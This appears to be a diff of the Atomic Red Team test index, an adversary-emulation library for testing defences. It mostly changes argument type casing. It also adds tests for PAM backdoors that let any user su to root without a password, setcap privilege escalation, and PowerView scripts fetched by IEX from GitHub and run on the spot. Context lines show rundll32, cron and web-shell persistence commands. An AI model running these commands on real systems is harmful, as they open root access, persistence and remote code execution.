           Remove-Item $dc_output_file -ErrorAction Ignore
 
           Write-Host "End of DCShadow"
-        cleanup_command: Stop-Process -Name "mimikatz" -Force -ErrorAction Ignore
+        cleanup_command: 'Stop-Process -Name "mimikatz" -Force -ErrorAction Ignore
+
+'
   T1014:
     technique:
       id: attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b
@@ -33238,7 +34076,7 @@ defense-evasion:
       input_arguments:
         rootkit_source_path:
           description: Path to the rootkit source. Used when prerequistes are fetched.
-          type: path
+          type: Path
           default: PathToAtomicsFolder/T1014/src/Linux
         rootkit_path:
           description: Path To rootkit
@@ -33251,7 +34089,7 @@ defense-evasion:
         temp_folder:
           description: Temp folder used to compile the code. Used when prerequistes
             are fetched.
-          type: path
+          type: Path
           default: "/tmp/T1014"
       dependency_executor_name: bash
       dependencies:
@@ -33286,7 +34124,7 @@ defense-evasion:
       input_arguments:
         rootkit_source_path:
           description: Path to the rootkit source. Used when prerequistes are fetched.
-          type: path
+          type: Path
           default: PathToAtomicsFolder/T1014/src/Linux
         rootkit_path:
           description: Path To rootkit
@@ -33299,7 +34137,7 @@ defense-evasion:
         temp_folder:
           description: Temp folder used to compile the code. Used when prerequistes
             are fetched.
-          type: path
+          type: Path
           default: "/tmp/T1014"
       dependency_executor_name: bash
       dependencies:
@@ -33509,7 +34347,7 @@ defense-evasion:
       input_arguments:
         command_to_execute:
           description: Command for rundll32.exe to execute
-          type: string
+          type: String
           default: calc.exe
       executor:
         command: 'rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
@@ -33527,7 +34365,7 @@ defense-evasion:
       input_arguments:
         inf_to_execute:
           description: Local location of inf file
-          type: string
+          type: String
           default: PathToAtomicsFolder\T1218.011\src\T1218.011.inf
       dependency_executor_name: powershell
       dependencies:
@@ -33557,7 +34395,7 @@ defense-evasion:
       input_arguments:
         inf_to_execute:
           description: Local location of inf file
-          type: string
+          type: String
           default: PathToAtomicsFolder\T1218.011\src\T1218.011.inf
       dependency_executor_name: powershell
       dependencies:
@@ -33586,7 +34424,7 @@ defense-evasion:
       input_arguments:
         inf_to_execute:
           description: Local location of inf file
-          type: string
+          type: String
           default: PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf
       dependency_executor_name: powershell
       dependencies:
@@ -33616,7 +34454,7 @@ defense-evasion:
       input_arguments:
         inf_to_execute:
           description: Local location of inf file
-          type: string
+          type: String
           default: PathToAtomicsFolder\T1218.011\src\T1218.011_DefaultInstall.inf
       dependency_executor_name: powershell
       dependencies:
@@ -33662,7 +34500,7 @@ defense-evasion:
       input_arguments:
         exe_to_launch:
           description: Path of the executable to launch
-          type: path
+          type: Path
           default: "%windir%\\System32\\notepad.exe"
       executor:
         command: 'rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}
@@ -34164,7 +35002,7 @@ defense-evasion:
       input_arguments:
         payload:
           description: hello.c payload
-          type: path
+          type: Path
           default: PathToAtomicsFolder/T1548.001/src/hello.c
       executor:
         command: |
@@ -34190,7 +35028,7 @@ defense-evasion:
       input_arguments:
         file_to_setuid:
           description: Path of file to set SetUID flag
-          type: path
+          type: Path
           default: "/tmp/evilBinary"
       executor:
         command: |
@@ -34213,7 +35051,7 @@ defense-evasion:
       input_arguments:
         file_to_setuid:
           description: Path of file to set SetGID flag
-          type: path
+          type: Path
           default: "/tmp/evilBinary"
       executor:
         command: |
@@ -34221,6 +35059,52 @@ defense-evasion:
           sudo chown root #{file_to_setuid}
           sudo chmod g+s #{file_to_setuid}
         cleanup_command: 'sudo rm #{file_to_setuid}
+
+'
+        name: sh
+        elevation_required: true
+    - name: Make and modify capabilities of a binary
+      auto_generated_guid: db53959c-207d-4000-9e7a-cd8eb417e072
+      description: |
+        Make and modify [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) of a C source code file.
+        The binary doesn't have to modify the UID, but the binary is given the capability to arbitrarily modify it at any time with `setuid(0)`.
+        Without being owned by root, the binary can set the UID to 0.
+      supported_platforms:
+      - linux
+      input_arguments:
+        payload:
+          description: cap.c payload
+          type: Path
+          default: PathToAtomicsFolder/T1548.001/src/cap.c
+      executor:
+        command: |
+          cp #{payload} /tmp/cap.c
+          make /tmp/cap
+          sudo setcap cap_setuid=ep /tmp/cap
+          /tmp/cap
+        cleanup_command: |
+          rm /tmp/cap
+          rm /tmp/cap.c
+        name: sh
+        elevation_required: true
+    - name: Provide the SetUID capability to a file
+      auto_generated_guid: 1ac3272f-9bcf-443a-9888-4b1d3de785c1
+      description: 'This test gives a file the capability to set UID without using
+        flags.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        file_to_setcap:
+          description: Path of file to provide the SetUID capability
+          type: Path
+          default: "/tmp/evilBinary"
+      executor:
+        command: |
+          touch #{file_to_setcap}
+          sudo setcap cap_setuid=ep #{file_to_setcap}
+        cleanup_command: 'rm #{file_to_setcap}
 
 '
         name: sh
@@ -34287,7 +35171,7 @@ defense-evasion:
       input_arguments:
         process_id:
           description: PID of process receiving injection
-          type: string
+          type: String
           default: '1000'
         dll_payload:
           description: DLL to inject
@@ -34321,7 +35205,7 @@ defense-evasion:
       input_arguments:
         powershell_code:
           description: PowerShell code to execute
-          type: string
+          type: String
           default: Start-Process calc.exe
       executor:
         command: 'SyncAppvPublishingServer.exe "n; #{powershell_code}"
@@ -34368,7 +35252,7 @@ defense-evasion:
       input_arguments:
         inf_to_execute:
           description: Local location of inf file
-          type: string
+          type: String
           default: PathToAtomicsFolder\T1218\src\Infdefaultinstall.inf
       dependency_executor_name: powershell
       dependencies:
@@ -34398,7 +35282,7 @@ defense-evasion:
       input_arguments:
         remote_url:
           description: url to document
-          type: url
+          type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx
       dependency_executor_name: powershell
       dependencies:
@@ -34431,7 +35315,7 @@ defense-evasion:
       input_arguments:
         xml_payload:
           description: XML to execution
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1218\src\T1218.xml
         mwcpath:
           description: Default location of Microsoft.Workflow.Compiler.exe
@@ -34469,11 +35353,11 @@ defense-evasion:
       input_arguments:
         xml_payload:
           description: XML to execution
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1218\src\T1218.xml
         renamed_binary:
           description: renamed Microsoft.Workflow.Compiler
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1218\src\svchost.exe
         mwcpath:
           description: Default location of Microsoft.Workflow.Compiler.exe
@@ -34517,13 +35401,13 @@ defense-evasion:
             not supplied, a 16-character random temporary module name is used. A PowerShell
             module can have any name. Because Get-VMRemoteFXPhysicalVideoAdapter abuses
             module load order, a module name must be specified.
-          type: string
+          type: String
           default: foo
         module_path:
           description: Specifies an alternate, non-default PowerShell module path
             for RemoteFXvGPUDisablement.exe. If -ModulePath is not specified, the
             first entry in %PSModulePath% will be used. Typically, this is %USERPROFILE%\Documents\WindowsPowerShell\Modules.
-          type: string
+          type: String
           default: "$PWD"
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Invoke-ATHRemoteFXvGPUDisablementCommand
@@ -34597,7 +35481,7 @@ defense-evasion:
       input_arguments:
         command_to_execute:
           description: A PowerShell command to execute.
-          type: string
+          type: String
           default: Start-Process calc
       executor:
         command: 'C:\windows\system32\SyncAppvPublishingServer.vbs "\n;#{command_to_execute}"
@@ -36885,7 +37769,7 @@ defense-evasion:
       input_arguments:
         file_folder_to_own:
           description: Path of the file or folder for takeown to take ownership.
-          type: path
+          type: Path
           default: "%temp%\\T1222.001_takeown_folder"
       dependency_executor_name: command_prompt
       dependencies:
@@ -36916,11 +37800,11 @@ defense-evasion:
       input_arguments:
         file_or_folder:
           description: Path of the file or folder to change permissions.
-          type: path
+          type: Path
           default: "%temp%\\T1222.001_cacls"
         user_or_group:
           description: User or group to allow full control
-          type: string
+          type: String
           default: Everyone
       dependency_executor_name: command_prompt
       dependencies:
@@ -36949,7 +37833,7 @@ defense-evasion:
       input_arguments:
         file_or_folder:
           description: Path of the file or folder remove attribute.
-          type: path
+          type: Path
           default: "%temp%\\T1222.001_attrib"
       dependency_executor_name: command_prompt
       dependencies:
@@ -36980,7 +37864,7 @@ defense-evasion:
       input_arguments:
         file_or_folder:
           description: Path of the file or folder remove attribute.
-          type: path
+          type: Path
           default: "%temp%\\T1222.001_attrib_2"
       dependency_executor_name: command_prompt
       dependencies:
@@ -37016,7 +37900,7 @@ defense-evasion:
       input_arguments:
         path:
           description: Path of folder to recursively set permissions on
-          type: path
+          type: Path
           default: C:\Users\Public\*
         file_path:
           description: Path of folder permission back
@@ -37206,11 +38090,11 @@ defense-evasion:
       input_arguments:
         wmic_command:
           description: WMI command to execute using wmic.exe
-          type: string
+          type: String
           default: process list
         local_xsl_file:
           description: Location of the test XSL script file on the local filesystem.
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1220\src\wmicscript.xsl
       dependency_executor_name: powershell
       dependencies:
@@ -37240,11 +38124,11 @@ defense-evasion:
       input_arguments:
         remote_xsl_file:
           description: Remote location of an XSL payload.
-          type: url
+          type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
         wmic_command:
           description: WMI command to execute using wmic.exe
-          type: string
+          type: String
           default: process list
       executor:
         command: 'wmic #{wmic_command} /FORMAT:"#{remote_xsl_file}"
@@ -37790,11 +38674,11 @@ persistence:
       input_arguments:
         xll_url:
           description: url of the file HelloWorldXll.xll
-          type: url
+          type: Url
           default: https://https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1137.006/bin/HelloWorldXll.xll?raw=true
         local_file:
           description: name of the xll file
-          type: path
+          type: Path
           default: "$env:tmp\\HelloWorldXll.xll"
       executor:
         name: powershell
@@ -37899,11 +38783,11 @@ persistence:
           default: SuperSP
         certificate_password:
           description: Password of the new certificate
-          type: string
+          type: String
           default: Passw0rd
         path_to_cert:
           description: Path of the new certificate, locally stored
-          type: string
+          type: String
           default: "$env:TEMP"
       dependency_executor_name: powershell
       dependencies:
@@ -37976,11 +38860,11 @@ persistence:
           default: SuperApp
         certificate_password:
           description: Password of the new certificate
-          type: string
+          type: String
           default: Passw0rd
         path_to_cert:
           description: Path of the new certificate, locally stored
-          type: string
+          type: String
           default: "$env:TEMP"
       dependency_executor_name: powershell
       dependencies:
@@ -38791,11 +39675,11 @@ persistence:
       input_arguments:
         remote_file:
           description: Remote file to download
-          type: url
+          type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
-          type: path
+          type: Path
           default: "%temp%\\bitsadmin1_flag.ps1"
       executor:
         command: 'bitsadmin.exe /transfer /Download /priority Foreground #{remote_file}
@@ -38818,11 +39702,11 @@ persistence:
       input_arguments:
         remote_file:
           description: Remote file to download
-          type: url
+          type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
-          type: path
+          type: Path
           default: "$env:TEMP\\bitsadmin2_flag.ps1"
       executor:
         command: 'Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination
@@ -38845,19 +39729,19 @@ persistence:
       input_arguments:
         command_path:
           description: Path of command to execute
-          type: path
+          type: Path
           default: C:\Windows\system32\notepad.exe
         bits_job_name:
           description: Name of BITS job
-          type: string
+          type: String
           default: AtomicBITS
         local_file:
           description: Local file path to save downloaded file
-          type: path
+          type: Path
           default: "%temp%\\bitsadmin3_flag.ps1"
         remote_file:
           description: Remote file to download
-          type: url
+          type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
       executor:
         command: |
@@ -38883,19 +39767,19 @@ persistence:
       input_arguments:
         remote_file:
           description: Remote file to download
-          type: url
+          type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
         download_path:
           description: Local file path to save downloaded file
-          type: path
+          type: Path
           default: SYSTEMROOT=C:\Windows\Temp
         cleanup_path:
           description: path to delete file as part of cleanup_command
-          type: path
+          type: Path
           default: C:\Windows\Temp\Personalization\LockScreenImage
         cleanup_file:
           description: file to remove as part of cleanup_command
-          type: string
+          type: String
           default: "*.md"
       executor:
         command: 'set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file}
@@ -40209,11 +41093,11 @@ persistence:
       input_arguments:
         command:
           description: Command to execute
-          type: string
+          type: String
           default: "/tmp/evil.sh"
         tmp_cron:
           description: Temporary reference file to hold evil cron schedule
-          type: path
+          type: Path
           default: "/tmp/persistevil"
       executor:
         name: bash
@@ -40237,11 +41121,11 @@ persistence:
       input_arguments:
         command:
           description: Command to execute
-          type: string
+          type: String
           default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log
         cron_script_name:
           description: Name of file to store in cron folder
-          type: string
+          type: String
           default: persistevil
       executor:
         elevation_required: true
@@ -40268,11 +41152,11 @@ persistence:
       input_arguments:
         command:
           description: Command to execute
-          type: string
+          type: String
           default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log
         cron_script_name:
           description: Name of file to store in /var/spool/cron/crontabs folder
-          type: string
+          type: String
           default: persistevil
       executor:
         elevation_required: true
@@ -40446,12 +41330,12 @@ persistence:
       input_arguments:
         process_name:
           description: Name of the created process
-          type: string
+          type: String
           default: calculator.exe
         gup_executable:
           description: GUP is an open source signed binary used by Notepad++ for software
             updates
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1574.002\bin\GUP.exe
       dependency_executor_name: powershell
       dependencies:
@@ -41205,7 +42089,7 @@ persistence:
       input_arguments:
         plist:
           description: Path to attacker emond plist file
-          type: path
+          type: Path
           default: PathToAtomicsFolder/T1546.014/src/T1546.014_emond.plist
       executor:
         command: |
@@ -41494,7 +42378,7 @@ persistence:
       input_arguments:
         chrome_url:
           description: chrome installer download URL
-          type: url
+          type: Url
           default: https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BFD62DDBC-14C6-20BD-706F-C7744738E422%7D%26lang%3Den%26browser%3D3%26usagestats%3D0%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26installdataindex%3Dempty/chrome/install/ChromeStandaloneSetup64.exe
         extension_id:
           description: chrome extension id
@@ -41944,19 +42828,19 @@ persistence:
       input_arguments:
         module_name:
           description: Name of the kernel module name.
-          type: string
+          type: String
           default: T1547006
         module_path:
           description: Folder used to store the module.
-          type: path
+          type: Path
           default: "/tmp/T1547.006/T1547006.ko"
         temp_folder:
           description: Temp folder used to compile the code.
-          type: path
+          type: Path
           default: "/tmp/T1547.006"
         module_source_path:
           description: Path to download Gsecdump binary file
-          type: url
+          type: Url
           default: PathToAtomicsFolder/T1547.006/src
       dependency_executor_name: bash
       dependencies:
@@ -42186,11 +43070,11 @@ persistence:
       input_arguments:
         plist_filename:
           description: filename
-          type: string
+          type: String
           default: com.atomicredteam.plist
         path_malicious_plist:
           description: Name of file to store in cron folder
-          type: string
+          type: String
           default: "$PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist"
       dependency_executor_name: bash
       dependencies:
@@ -42305,11 +43189,11 @@ persistence:
       input_arguments:
         plist_filename:
           description: filename
-          type: string
+          type: String
           default: com.atomicredteam.plist
         path_malicious_plist:
           description: Name of file to store in cron folder
-          type: string
+          type: String
           default: "$PathToAtomicsFolder/T1543.004/src/atomicredteam_T1543_004.plist"
       dependency_executor_name: bash
       dependencies:
@@ -42400,15 +43284,15 @@ persistence:
       input_arguments:
         script_location:
           description: evil plist location
-          type: path
+          type: Path
           default: "$PathToAtomicsFolder/T1053.004/src/atomicredteam_T1053_004.plist"
         script_destination:
           description: Path where to move the evil plist
-          type: path
+          type: Path
           default: "/etc/emond.d/rules/atomicredteam_T1053_004.plist"
         empty_file:
           description: Random name of the empty file used to trigger emond service
-          type: string
+          type: String
           default: randomflag
       executor:
         name: bash
@@ -43468,15 +44352,15 @@ persistence:
         url:
           description: URL to Outlook Home Page containing the payload to execute
             (can be local file:// or remote https://)
-          type: string
+          type: String
           default: file://PathToAtomicsFolder\T1137.004\src\T1137.004.html
         outlook_version:
           description: Version of Outlook that is installed
-          type: string
+          type: String
           default: 16.0
         outlook_folder:
           description: Name of the Outlook folder to modify the homepage setting for
-          type: string
+          type: String
           default: Inbox
       executor:
         name: command_prompt
@@ -43940,7 +44824,7 @@ persistence:
         service_executable:
           description: Path of the executable used for the service and as the hijacked
             program.exe
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1574.009\bin\WindowsServiceExample.exe
       executor:
         command: |
@@ -44124,7 +45008,100 @@ persistence:
       x_mitre_platforms:
       - Linux
       - macOS
-    atomic_tests: []
+      identifier: T1556.003
+    atomic_tests:
+    - name: Malicious PAM rule
+      auto_generated_guid: 4b9dde80-ae22-44b1-a82a-644bf009eb9c
+      description: |
+        Inserts a rule into a PAM config and then tests it.
+
+        Upon successful execution, this test will insert a rule that allows every user to su to root without a password.
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_pam_conf:
+          description: PAM config file to modify.
+          type: String
+          default: "/etc/pam.d/su-l"
+        pam_rule:
+          description: Rule to add to the PAM config.
+          type: String
+          default: auth sufficient pam_succeed_if.so uid >= 0
+        index:
+          description: Index where the rule is inserted.
+          type: Integer
+          default: 1
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
+
+'
+        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}
+
+'
+    - name: Malicious PAM module
+      auto_generated_guid: 65208808-3125-4a2e-8389-a0a00e9ab326
+      description: |
+        Creates a PAM module, inserts a rule to use it, and then tests it.
+
+        Upon successful execution, this test will create a PAM module that allows every user to su to root without a password.
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_pam_conf:
+          description: PAM config file to modify.
+          type: String
+          default: "/etc/pam.d/su-l"
+        pam_rule:
+          description: Rule to add to the PAM config.
+          type: String
+          default: auth sufficient /tmp/pam_evil.so
+        index:
+          description: Index where the rule is inserted.
+          type: Integer
+          default: 1
+        path_to_pam_module_source:
+          description: Path to PAM module source code.
+          type: Path
+          default: PathToAtomicsFolder/T1556.003/src/pam_evil.c
+        path_to_pam_module:
+          description: Path to PAM module object
+          type: Path
+          default: "/tmp/pam_evil.so"
+      dependencies:
+      - description: 'The PAM development library must be installed to build the PAM
+          module
+
+'
+        prereq_command: 'if [ -f /usr/include/security/pam_modules.h ]; then exit
+          0; else exit 1; fi;
+
+'
+        get_prereq_command: 'if [ -n "`which apt-get`" ]; then sudo apt-get -y install
+          libpam0g-dev; elif [ -n "`which yum`" ]; then sudo yum -y install pam-devel;
+          fi
+
+'
+      - description: 'The PAM module must exist on disk at specified location (#{path_to_pam_module})
+
+'
+        prereq_command: 'if [ -f #{path_to_pam_module} ]; then exit 0; else exit 1;
+          fi;
+
+'
+        get_prereq_command: 'sudo gcc -shared -fPIC -o #{path_to_pam_module} #{path_to_pam_module_source}
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
+
+'
+        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}
+
+'
   T1205.001:
     technique:
       external_references:
@@ -44751,7 +45728,7 @@ persistence:
       input_arguments:
         script:
           description: path to script
-          type: path
+          type: Path
           default: "/path/to/script"
       executor:
         command: 'sudo defaults write com.apple.loginwindow LoginHook #{script}
@@ -45339,7 +46316,7 @@ persistence:
         time:
           description: What time 24 Hour
           type: String
-          default: 72600
+          default: '20:10'
       executor:
         name: command_prompt
         elevation_required: false
@@ -45365,7 +46342,7 @@ persistence:
         time:
           description: What time 24 Hour
           type: String
-          default: 72600
+          default: '20:10'
         target:
           description: Target
           type: String
@@ -45605,7 +46582,7 @@ persistence:
       input_arguments:
         input_binary:
           description: Executable binary to use in place of screensaver for persistence
-          type: path
+          type: Path
           default: C:\Windows\System32\cmd.exe
       executor:
         command: |
@@ -46008,7 +46985,7 @@ persistence:
       input_arguments:
         shortcut_file_path:
           description: shortcut modified and execute
-          type: path
+          type: Path
           default: "%temp%\\T1547.009_modified_shortcut.url"
       executor:
         command: |
@@ -46803,15 +47780,15 @@ persistence:
       input_arguments:
         class_factory:
           description: Class factory of transport agent.
-          type: string
+          type: String
           default: Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory
         dll_path:
           description: Path of DLL to use as transport agent.
-          type: path
+          type: Path
           default: c:\program files\microsoft\Exchange Server\v15\bin\Microsoft.Exchange.Security.Interop.dll
         transport_agent_identity:
           description: Friendly name of transport agent once installed.
-          type: string
+          type: String
           default: Security Interop Agent
       dependencies:
       - description: 'Microsoft Exchange SnapIn must be installed
@@ -47041,7 +48018,7 @@ persistence:
       input_arguments:
         command_to_add:
           description: Command to add to the .bash_profile file
-          type: string
+          type: String
           default: "/path/to/script.py"
       executor:
         command: 'echo "#{command_to_add}" >> ~/.bash_profile
@@ -47059,7 +48036,7 @@ persistence:
       input_arguments:
         command_to_add:
           description: Command to add to the .bashrc file
-          type: string
+          type: String
           default: "/path/to/script.py"
       executor:
         command: 'echo "#{command_to_add}" >> ~/.bashrc
@@ -47223,11 +48200,11 @@ persistence:
       input_arguments:
         web_shell_path:
           description: The path to drop the web shell
-          type: string
+          type: String
           default: C:\inetpub\wwwroot
         web_shells:
           description: Path of Web Shell
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1505.003\src\
       dependency_executor_name: powershell
       dependencies:
@@ -47830,15 +48807,15 @@ impact:
       input_arguments:
         user_account:
           description: User account whose password will be changed.
-          type: string
+          type: String
           default: AtomicAdministrator
         new_user_password:
           description: Password to use if user account must be created first
-          type: string
+          type: String
           default: User2ChangePW!
         new_password:
           description: New password for the specified account.
-          type: string
+          type: String
           default: HuHuHUHoHo283283@dJD
       executor:
         command: |
@@ -47860,11 +48837,11 @@ impact:
       input_arguments:
         new_user_password:
           description: Password to use if user account must be created first
-          type: string
+          type: String
           default: User2DeletePW!
         user_account:
           description: User account to be deleted.
-          type: string
+          type: String
           default: AtomicUser
       executor:
         command: |
@@ -47894,15 +48871,15 @@ impact:
       input_arguments:
         super_user:
           description: Account used to run the execution command (must include domain).
-          type: string
+          type: String
           default: domain\super_user
         super_pass:
           description: super_user account password.
-          type: string
+          type: String
           default: password
         remove_user:
           description: Account to remove from domain admins.
-          type: string
+          type: String
           default: remove_user
       executor:
         command: |
@@ -48127,7 +49104,7 @@ impact:
           default: "$env:TEMP\\Sdelete\\sdelete.exe"
         file_to_delete:
           description: Path of file to delete
-          type: path
+          type: Path
           default: "$env:TEMP\\T1485.txt"
       dependency_executor_name: powershell
       dependencies:
@@ -49249,7 +50226,7 @@ impact:
       input_arguments:
         url_of_wallpaper:
           description: URL pointing to the image file you wish to set as wallpaper
-          type: url
+          type: Url
           default: https://redcanary.com/wp-content/uploads/Atomic-Red-Team-Logo.png
         pointer_to_orginal_wallpaper:
           description: Full path to where a file containing the original wallpaper
@@ -49990,8 +50967,8 @@ impact:
       input_arguments:
         timeout:
           description: Timeout period before shutdown (seconds)
-          type: string
-          default: '1'
+          type: Integer
+          default: 1
       executor:
         command: 'shutdown /s /t #{timeout}
 
@@ -50008,8 +50985,8 @@ impact:
       input_arguments:
         timeout:
           description: Timeout period before restart (seconds)
-          type: string
-          default: '1'
+          type: Integer
+          default: 1
       executor:
         command: 'shutdown /r /t #{timeout}
 
@@ -50027,7 +51004,7 @@ impact:
       input_arguments:
         timeout:
           description: Time to restart (can be minutes or specific time)
-          type: string
+          type: String
           default: now
       executor:
         command: 'shutdown -r #{timeout}
@@ -50046,7 +51023,7 @@ impact:
       input_arguments:
         timeout:
           description: Time to shutdown (can be minutes or specific time)
-          type: string
+          type: String
           default: now
       executor:
         command: 'shutdown -h #{timeout}
@@ -50278,11 +51255,11 @@ discovery:
       input_arguments:
         input_source_code:
           description: Path to source of C# code
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1010\src\T1010.cs
         output_file_name:
           description: Name of output binary
-          type: string
+          type: String
           default: "%TEMP%\\T1010.exe"
       dependency_executor_name: powershell
       dependencies:
@@ -51189,7 +52166,7 @@ discovery:
       input_arguments:
         user:
           description: User to identify what groups a user is a member of
-          type: string
+          type: String
           default: administrator
       executor:
         command: 'get-ADPrincipalGroupMembership #{user} | select name
@@ -51521,6 +52498,34 @@ discovery:
       executor:
         command: "#{adfind_path} -gcb -sc trustdmp\n"
         name: command_prompt
+    - name: Get-DomainTrust with PowerView
+      auto_generated_guid: f974894c-5991-4b19-aaf5-7cc2fe298c5d
+      description: 'Utilizing PowerView, run Get-DomainTrust to identify domain trusts.
+        Upon execution, progress and info about trusts within the domain being scanned
+        will be displayed.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose
+        name: powershell
+    - name: Get-ForestTrust with PowerView
+      auto_generated_guid: 58ed10e8-0738-4651-8408-3a3e9a526279
+      description: 'Utilizing PowerView, run Get-ForestTrust to identify forest trusts.
+        Upon execution, progress and info about forest trusts within the domain being
+        scanned will be displayed.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose
+        name: powershell
   T1087.003:
     technique:
       external_references:
@@ -51676,7 +52681,7 @@ discovery:
       input_arguments:
         output_file:
           description: Output file used to store the results.
-          type: path
+          type: Path
           default: "/tmp/T1083.txt"
       executor:
         command: |
@@ -51703,7 +52708,7 @@ discovery:
       input_arguments:
         output_file:
           description: Output file used to store the results.
-          type: path
+          type: Path
           default: "/tmp/T1083.txt"
       executor:
         command: |
@@ -52150,15 +53155,15 @@ discovery:
       input_arguments:
         host:
           description: Host to scan.
-          type: string
+          type: String
           default: 192.168.1.1
         port:
           description: Ports to scan.
-          type: string
+          type: String
           default: '80'
         network_range:
           description: Network Range to Scan.
-          type: string
+          type: String
           default: 192.168.1.0/24
       dependency_executor_name: sh
       dependencies:
@@ -52187,11 +53192,11 @@ discovery:
       input_arguments:
         nmap_url:
           description: NMap installer download URL
-          type: url
+          type: Url
           default: https://nmap.org/dist/nmap-7.80-setup.exe
         host_to_scan:
           description: The host to scan with NMap
-          type: string
+          type: String
           default: 127.0.0.1
       dependency_executor_name: powershell
       dependencies:
@@ -52216,7 +53221,7 @@ discovery:
       input_arguments:
         host_ip:
           description: Host to scan.
-          type: string
+          type: String
           default: 127.0.0.1
         filename:
           description: Location of the project file
@@ -52306,7 +53311,7 @@ discovery:
       input_arguments:
         computer_name:
           description: Computer name to find a mount on.
-          type: string
+          type: String
           default: computer1
       executor:
         command: |
@@ -52324,11 +53329,11 @@ discovery:
       input_arguments:
         package_checker:
           description: Package checking command. Debian - dpkg -s samba
-          type: string
+          type: String
           default: rpm -q samba
         package_installer:
           description: Package installer command. Debian - apt install samba
-          type: string
+          type: String
           default: yum install -y samba
       dependency_executor_name: bash
       dependencies:
@@ -52356,7 +53361,7 @@ discovery:
       input_arguments:
         computer_name:
           description: Computer name to find a mount on.
-          type: string
+          type: String
           default: localhost
       executor:
         command: 'net view \\#{computer_name}
@@ -52545,19 +53550,19 @@ discovery:
           default: Ethernet
         wireshark_url:
           description: wireshark installer download URL
-          type: url
+          type: Url
           default: https://1.eu.dl.wireshark.org/win64/Wireshark-win64-3.4.5.exe
         tshark_path:
           description: path to tshark.exe
-          type: path
+          type: Path
           default: c:\program files\wireshark\tshark.exe
         npcap_url:
           description: npcap installed download URL
-          type: url
+          type: Url
           default: https://nmap.org/npcap/dist/npcap-1.31.exe
         npcap_path:
           description: path to npcap.sys
-          type: path
+          type: Path
           default: C:\Program Files\Npcap\npcap.sys
       dependency_executor_name: powershell
       dependencies:
@@ -53189,15 +54194,15 @@ discovery:
       input_arguments:
         start_host:
           description: Subnet used for ping sweep.
-          type: string
+          type: String
           default: '1'
         stop_host:
           description: Subnet used for ping sweep.
-          type: string
+          type: String
           default: '254'
         subnet:
           description: Subnet used for ping sweep.
-          type: string
+          type: String
           default: 192.168.1
       executor:
         command: 'for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip;
@@ -53234,15 +54239,15 @@ discovery:
       input_arguments:
         user_name:
           description: username including domain.
-          type: string
+          type: String
           default: domain\user
         acct_pass:
           description: Account password.
-          type: string
+          type: String
           default: password
         host_name:
           description: hostname or ip address to connect to.
-          type: string
+          type: String
           default: 192.168.1.1
       dependency_executor_name: powershell
       dependencies:
@@ -53800,7 +54805,7 @@ discovery:
       input_arguments:
         output_file:
           description: Output file used to store the results.
-          type: path
+          type: Path
           default: "/tmp/T1082.txt"
       executor:
         command: "uname -a >> #{output_file}\nif [ -f /etc/lsb-release ]; then cat
@@ -54354,12 +55359,12 @@ discovery:
       input_arguments:
         SharpView_url:
           description: sharpview download URL
-          type: url
+          type: Url
